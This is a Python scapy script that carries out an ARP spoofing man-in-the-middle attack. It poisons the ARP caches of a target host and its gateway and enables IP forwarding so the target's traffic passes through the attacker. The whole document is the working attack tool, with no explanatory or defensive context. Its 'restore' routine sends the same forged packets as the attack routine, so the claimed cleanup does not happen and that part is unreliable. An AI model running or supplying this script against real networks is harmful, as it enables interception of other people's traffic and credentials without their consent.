from scapy.all import *
import os
import time
import sys

conf.iface = "wlan0"

def get_mac(ip):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, verbose=0)
    return ans[0][1].hwsrc if ans else None

def spoof(target_ip, gateway_ip, target_mac, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)

def restore(target_ip, gateway_ip, target_mac, gateway_mac):
    send(ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
    send(ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: sudo python3 arpspoof.py <target_ip> <gateway_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    gateway_ip = sys.argv[2]

    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    if not target_mac or not gateway_mac:
        print("[-] Could not find MAC addresses. Exiting.")
        sys.exit(1)

    print(f"[+] Target MAC: {target_mac}")
    print(f"[+] Gateway MAC: {gateway_mac}")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    print("[+] IP forwarding enabled")

    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac, gateway_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[+] Restoring ARP tables...")
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        print("[+] Done.")